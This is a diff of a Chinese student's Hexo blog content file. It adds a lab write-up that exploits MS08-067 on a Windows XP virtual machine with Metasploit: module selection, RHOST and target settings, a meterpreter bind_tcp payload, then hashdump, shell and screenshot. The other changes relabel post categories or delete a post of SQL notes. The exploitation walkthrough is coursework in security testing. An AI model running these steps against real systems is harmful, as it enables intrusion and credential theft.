445</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520205402500.png"  alt="image-20200520205402500">445端口打开</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520205451056.png"  alt="image-20200520205451056">445端口关闭</p>
+<p>（本系统的445端口默认关闭）</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业八image-20200520205606131.png"  alt="image-20200520205606131" style="zoom:100%;">防火墙和自动更新已关闭</p>
+<h5 id="打开metasploit"><a href="#打开metasploit" class="headerlink" title="打开metasploit"></a>打开metasploit</h5><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/1811494刘旭萌_8.assets\image-20200519220205462.png"  alt="image-20200519220205462" style="zoom:67%;">
+
+<h5 id="查看对应漏洞相关攻击模块"><a href="#查看对应漏洞相关攻击模块" class="headerlink" title="查看对应漏洞相关攻击模块"></a>查看对应漏洞相关攻击模块</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">search ms08_067</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520193348371.png"  alt="image-20200520193348371"></p>
+<h5 id="选定要进行渗透的攻击模块"><a href="#选定要进行渗透的攻击模块" class="headerlink" title="选定要进行渗透的攻击模块"></a>选定要进行渗透的攻击模块</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520193654664.png"  alt="image-20200520193654664"></p>
+<h5 id="查看模块有关选项"><a href="#查看模块有关选项" class="headerlink" title="查看模块有关选项"></a>查看模块有关选项</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520194020076.png"  alt="image-20200520194020076"></p>
+<h5 id="设定攻击目标"><a href="#设定攻击目标" class="headerlink" title="设定攻击目标"></a>设定攻击目标</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 192.168.89.141</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520194221871.png"  alt="image-20200520194221871"></p>
+<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520210231512.png"  alt="image-20200520210231512"></p>
+<p>攻击成功</p>
+<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业八image-20200520210303096.png"  alt="image-20200520210303096" style="zoom:80%;">
+
+<h5 id="利用漏洞对目标主机进行控制"><a href="#利用漏洞对目标主机进行控制" class="headerlink" title="利用漏洞对目标主机进行控制"></a>利用漏洞对目标主机进行控制</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure>
+
+<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业八image-20200520210905926.png"  alt="image-20200520210905926" style="zoom:67%;">
+
+<h5 id="使用正向连接shell"><a href="#使用正向连接shell" class="headerlink" title="使用正向连接shell"></a>使用正向连接shell</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520211948981.png"  alt="image-20200520211948981"></p>
+<p>show options查看该攻击载荷有无其它要求</p>
+<h5 id="设置系统版本号"><a href="#设置系统版本号" class="headerlink" title="设置系统版本号"></a>设置系统版本号</h5><p>XP sp3 中文简体办-&gt;34</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> target 34</span><br></pre></td></tr></table></figure>
+
+<h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520212928849.png"  alt="image-20200520212928849"></p>
+<p>攻击成功</p>
+<h5 id="得到用户信息"><a href="#得到用户信息" class="headerlink" title="得到用户信息"></a>得到用户信息</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520213231876.png"  alt="image-20200520213231876"></p>
+<h5 id="获取目标主机的控制权"><a href="#获取目标主机的控制权" class="headerlink" title="获取目标主机的控制权"></a>获取目标主机的控制权</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业八image-20200520213432872.png"  alt="image-20200520213432872" style="zoom:70%;">
+
+<h5 id="浏览目标主机目录"><a href="#浏览目标主机目录" class="headerlink" title="浏览目标主机目录"></a>浏览目标主机目录</h5><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业八image-20200520213543124.png"  alt="image-20200520213543124" style="zoom:50%;">
+
+<h5 id="退回meterpreter"><a href="#退回meterpreter" class="headerlink" title="退回meterpreter"></a>退回meterpreter</h5><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%ABimage-20200520213721875.png"  alt="image-20200520213721875"></p>
+<h5 id="屏幕快照"><a href="#屏幕快照" class="headerlink" title="屏幕快照"></a>屏幕快照</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure>
+
+<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业八image-20200520214041538.png"  alt="image-20200520214041538" style="zoom:67%;">
+
+<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/blog\hexo\source\_posts\漏测作业八.assets\image-20200521160637123.png"  alt="image-20200521160637123" style="zoom: 50%;">
+
+]]></content>
+      <categories>
+        <category>漏洞测试作业</category>
+      </categories>
+      <tags>
+        <tag>kali linux</tag>
+        <tag>nessus</tag>
+        <tag>metasploit</tag>
+        <tag>ms08_067</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>虚拟机复制后无法连网</title>
     <url>/2020/05/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%A4%8D%E5%88%B6%E5%90%8E%E6%97%A0%E6%B3%95%E8%BF%9E%E7%BD%91/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>虚拟机设置-&gt;移除网络适配器-&gt;添加网络适配器</p>
 <img src="/img/loading.gif" class="lazyload" data-src="/images/虚拟机复制后无法连网.assets/image-20200520183137820.png"  alt="image-20200520183137820" style="zoom: 33%;">]]></content>
       <categories>
-        <category>问题解决</category>
+        <category>vmware</category>
       </categories>
       <tags>
         <tag>虚拟机</tag>
@@ -185,7 +451,7 @@
 <p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%83/image-20200507020421987.png"  alt="image-20200507020421987"></p>
 ]]></content>
       <categories>
-        <category>major</category>
+        <category>漏洞测试作业</category>
       </categories>
       <tags>
         <tag>模糊测试</tag>
@@ -250,7 +516,7 @@
 <p>弹出对话框，实验成功</p>
 <img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业六/image-20200418000555901.png"  alt="image-20200418000555901" style="zoom:67%;">]]></content>
       <categories>
-        <category>major</category>
+        <category>漏洞测试作业</category>
       </categories>
       <tags>
         <tag>漏洞测试</tag>
@@ -282,7 +548,7 @@
 </ul>
 <img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业五/image-20200415191536378.png"  alt="image-20200415191536378" style="zoom:50%;">]]></content>
       <categories>
-        <category>major</category>
+        <category>漏洞测试作业</category>
       </categories>
       <tags>
         <tag>漏洞测试</tag>
@@ -538,7 +804,7 @@
 <p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/025c2arb9p2cl7zobvidr2os/image_1dr4o2cvk1qlb1sb415vk12tf2809.png"  alt="image_1dr4o2cvk1qlb1sb415vk12tf2809.png-232.8kB"><br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/7d06ip8oqn0p4wh2lvexb1yb/image_1dr4ocqmb1fso4tc1c4t7ad1ldcm.png"  alt="image_1dr4ocqmb1fso4tc1c4t7ad1ldcm.png-210.7kB"></p>
 ]]></content>
       <categories>
-        <category>作业</category>
+        <category>python</category>
       </categories>
       <tags>
         <tag>python</tag>
@@ -782,7 +1048,7 @@
 </blockquote>
 ]]></content>
       <categories>
-        <category>自己学的零七八碎</category>
+        <category>Flask</category>
       </categories>
       <tags>
         <tag>Flask</tag>
@@ -870,7 +1136,7 @@
             <p>部分内容借鉴：</p><ul><li>中国工信出版社集团 人民邮电出版社《Flask Web开发第二版》</li><li></li></ul>
           </div>]]></content>
       <categories>
-        <category>自己学的零七八碎</category>
+        <category>Flask</category>
       </categories>
       <tags>
         <tag>Flask</tag>
@@ -1441,7 +1707,7 @@
 <p>在发送至163邮箱时出现了被当成垃圾邮件被拒收的情况（TAT），发送到qq邮箱是可以的</p>
 ]]></content>
       <categories>
-        <category>自己学的零七八碎</category>
+        <category>Flask</category>
       </categories>
       <tags>
         <tag>Flask</tag>
@@ -2338,7 +2604,7 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
 </ul>
 ]]></content>
       <categories>
-        <category>major</category>
+        <category>漏洞测试作业</category>
       </categories>
       <tags>
         <tag>漏洞测试</tag>
@@ -2880,7 +3146,7 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
 <p>跳转成功并输出passed</p>
 <img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业三/image-20200323122711537.png"  alt="image-20200323122711537" style="zoom:80%;">]]></content>
       <categories>
-        <category>major</category>
+        <category>漏洞测试作业</category>
       </categories>
       <tags>
         <tag>漏洞测试</tag>
@@ -3162,7 +3428,7 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
 </ul>
 ]]></content>
       <categories>
-        <category>major</category>
+        <category>漏洞测试作业</category>
       </categories>
       <tags>
         <tag>漏洞测试</tag>
@@ -3626,79 +3892,6 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
       </tags>
   </entry>
   <entry>
-    <title>sql语言</title>
-    <url>/2020/03/16/sql/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ul>
-<li>创建数据库</li>
-<li>插入数据存储过程代码</li>
-</ul>
-<a id="more"></a>
-
-<h1 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h1><p>创建work1.sql文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">CREATE TABLE &#96;innodb&#96;(</span><br><span class="line">	&#96;id&#96; int(11) NULL DEFAULT 0,</span><br><span class="line">	&#96;data&#96; int(11) NULL DEFAULT 0)</span><br><span class="line">	ENGINE&#x3D;InnoDB;</span><br><span class="line"></span><br><span class="line">CREATE TABLE &#96;myisam&#96;(</span><br><span class="line">	&#96;id&#96; int(11) NULL DEFAULT 0,</span><br><span class="line">	&#96;data&#96; int(11) NULL DEFAULT 0)</span><br><span class="line">	ENGINE&#x3D;myisam;</span><br><span class="line"></span><br><span class="line">create procedure myinsert(a int)</span><br><span class="line">	begin</span><br><span class="line">		declare i int default 1;</span><br><span class="line">		repeat</span><br><span class="line">			insert into &#96;innodb&#96;  VALUES(i,i);</span><br><span class="line">			set i&#x3D;i+1;</span><br><span class="line">		until i&gt;a end repeat;</span><br><span class="line">	end;</span><br><span class="line"></span><br><span class="line">-- 执行存储过程</span><br><span class="line">call myinsert(10000);</span><br><span class="line">-- 删除myinsert函数</span><br><span class="line">drop procedure if exists myinsert;</span><br></pre></td></tr></table></figure>
-<p>可以编写sql文件，也可在命令列界面中分步运行</p>
-<p>运行之后需要刷新</p>
-<p><img src="/img/loading.gif" class="lazyload" data-src="/images/image-20200316214043980.png"  alt="image-20200316214043980" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/1584365805(1).png"  alt="1584365805(1).png" style="zoom:35%;"></p>
-<h2 id="针对数据库的操作"><a href="#针对数据库的操作" class="headerlink" title="针对数据库的操作"></a>针对数据库的操作</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看当前数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> Management_System</span><br><span class="line"><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4	</span><br><span class="line"><span class="keyword">DEFAULT</span> <span class="keyword">COLLATE</span> utf8mb4_unicode_ci;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Use</span> Flight_Management_System;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 删除数据库</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> [ <span class="keyword">IF</span> <span class="keyword">EXISTS</span> ] &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure>
-
-<h2 id="针对表的操作"><a href="#针对表的操作" class="headerlink" title="针对表的操作"></a>针对表的操作</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 向表中添加数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`flight`</span> <span class="keyword">values</span>(<span class="string">'CA123'</span>,<span class="string">'TSN'</span>,<span class="string">'TAO'</span>,<span class="string">'CA'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 清空表</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> [表名];</span><br></pre></td></tr></table></figure>
-
-<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><p>当输出的属性不为主键时,可能出现重复 </p>
-<h3 id="LIKE-NOT-LIKE匹配"><a href="#LIKE-NOT-LIKE匹配" class="headerlink" title="LIKE/NOT LIKE匹配"></a>LIKE/NOT LIKE匹配</h3><p>% 代表任意字符串</p>
-<p>_ 代表一个字符</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT	name</span><br><span class="line">FROM	drinkers</span><br><span class="line">WHERE	phone LIKE &#39;555%&#39;;</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 查找所有李姓员工</span><br><span class="line">SELECT	*</span><br><span class="line">FROM	employee </span><br><span class="line">WHERE	empname LIKE &#39;李%&#39;;</span><br></pre></td></tr></table></figure>
-
-<h3 id="NULL空值"><a href="#NULL空值" class="headerlink" title="NULL空值"></a>NULL空值</h3><p>任意字符串(%)与空值比较的结果是<code>unknown</code>,不会返回unknown结果值</p>
-<p>true=1,false=0,unknown=1/2</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 查找所有job非空的元组</span><br><span class="line">SELECT	*</span><br><span class="line">FROM	workson</span><br><span class="line">WHERE	job LIKE &#39;%&#39;;	-- 或者为 job IS NOT NULL</span><br></pre></td></tr></table></figure>
-<h3 id="ORDER-BY-输出排序"><a href="#ORDER-BY-输出排序" class="headerlink" title="ORDER BY 输出排序"></a>ORDER BY 输出排序</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORDER BY &lt;list of attributes&gt;</span><br><span class="line">ASC(升序,默认),DESC(降序)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT	enpname</span><br><span class="line">FROM	employee</span><br><span class="line">WHERE	deptno&#x3D;&#39;d2&#39;</span><br><span class="line">ORDER BY empno DESC;	-- 可以按照不输出的属性排序</span><br></pre></td></tr></table></figure>
-
-<h3 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h3><h4 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 使用笛卡尔积连接两个表</span><br><span class="line">-- 两个表中有同名属性,select其中一个时需要标明,不然会出现两列</span><br><span class="line">SELECT	beer</span><br><span class="line">FROM	frequents,likes </span><br><span class="line">WHERE	bar&#x3D;&#39;Joe&quot;s Bar&#39; AND	</span><br><span class="line">		frequents.drinker &#x3D; likes.drinker;</span><br><span class="line">		-- 待查找的内容为&#39;-&gt;&quot;</span><br></pre></td></tr></table></figure>
-
-<h4 id="natural-join"><a href="#natural-join" class="headerlink" title="natural join"></a>natural join</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT	*</span><br><span class="line">FROM	employee natrual join department</span><br><span class="line">WHERE	location&#x3D;&#39;天津&#39;;</span><br><span class="line">-- 相同的两列不重复出现</span><br><span class="line"></span><br><span class="line">-- 等价</span><br><span class="line">SELECT	*</span><br><span class="line">FROM	employee,department</span><br><span class="line">WHERE	department.deptno&#x3D;employee.deptno and</span><br><span class="line">		location&#x3D;&#39;天津&#39;;</span><br><span class="line">-- 使用and&#x2F;or连接多个查询条件</span><br></pre></td></tr></table></figure>
-
-<h4 id="元组变量"><a href="#元组变量" class="headerlink" title="元组变量"></a>元组变量</h4><p>引入一个关系的两个或更多部分</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 返回制造商一致的啤酒对</span><br><span class="line">SELECT	b1.name,b2.name</span><br><span class="line">FROM	beers b1,beers b2</span><br><span class="line">WHERE	b1.manf&#x3D;b2.manf and</span><br><span class="line">		b1.name&lt;b2.name; -- 避免冗余</span><br></pre></td></tr></table></figure>
-
-<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><h4 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- find bars that serve Miller at the same price Joe charges for Bud</span><br><span class="line">SELECT	bar</span><br><span class="line">FROM	sells</span><br><span class="line">WHERE	beer&#x3D;&#39;Miller&#39; and price&#x3D;</span><br><span class="line">			(SELECT	price</span><br><span class="line">			FROM	sells</span><br><span class="line">			WHERE	bar&#x3D;&#39;Joe&quot;s Bar&#39; and beer&#x3D;&#39;Bud&#39;);</span><br></pre></td></tr></table></figure>
-
-<h4 id="IN-NOT-IN操作"><a href="#IN-NOT-IN操作" class="headerlink" title="IN/NOT IN操作"></a>IN/NOT IN操作</h4><p>只能用于连接查询结果,而不能是 in+&lt;表&gt;</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT	*</span><br><span class="line">FROM	Beers</span><br><span class="line">WHERE	name IN </span><br><span class="line">			(SELECT beer</span><br><span class="line">			FROM likes</span><br><span class="line">			WHERE drinker&#x3D;&#39;Fred&#39;); </span><br><span class="line">			-- 当子查询只有一个查询结果,in可改为&#x3D;</span><br><span class="line">-- 或写成</span><br><span class="line">SELECT	name,manf</span><br><span class="line">FROM	Beers,Likes</span><br><span class="line">WHERE	drinker&#x3D;&#39;Fred&#39; and beer&#x3D;name;</span><br></pre></td></tr></table></figure>
-
-<h4 id="EXITS"><a href="#EXITS" class="headerlink" title="EXITS"></a>EXITS</h4><p>当且仅当关系非空时为真</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 不存在制造商一致的不同啤酒-&gt; 一个manf只有一个beer的beer</span><br><span class="line">SELECT	name</span><br><span class="line">FROM	beers b1</span><br><span class="line">WHERE	NOT EXISTS</span><br><span class="line">			(SELECT *</span><br><span class="line">             FROM	beers</span><br><span class="line">             WHERE	manf &#x3D; b1.manf and</span><br><span class="line">             		name &lt;&gt; b1.name);</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 查找部门中只有一名员工的员工姓名</span><br><span class="line">SELECT	empname</span><br><span class="line">FROM	empoyee e1</span><br><span class="line">WHERE	not exists</span><br><span class="line">		(SELECT	*</span><br><span class="line">         FROM	employee</span><br><span class="line">         WHERE	deptno&#x3D;e1.deptno and</span><br><span class="line">        		empname&lt;&gt;e1.empname);</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT	</span><br><span class="line">FROM	</span><br><span class="line">WHERE</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT	</span><br><span class="line">FROM	</span><br><span class="line">WHERE</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT	</span><br><span class="line">FROM	</span><br><span class="line">WHERE</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT	</span><br><span class="line">FROM	</span><br><span class="line">WHERE</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <tags>
-        <tag>数据库</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>数据库上机L2</title>
     <url>/2020/03/16/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL2%EF%BC%9A%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%BB%A3%E7%A0%81/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ul>
@@ -3821,7 +4014,7 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
 </ul>
 ]]></content>
       <categories>
-        <category>major</category>
+        <category>漏洞测试作业</category>
       </categories>
       <tags>
         <tag>漏洞测试</tag>
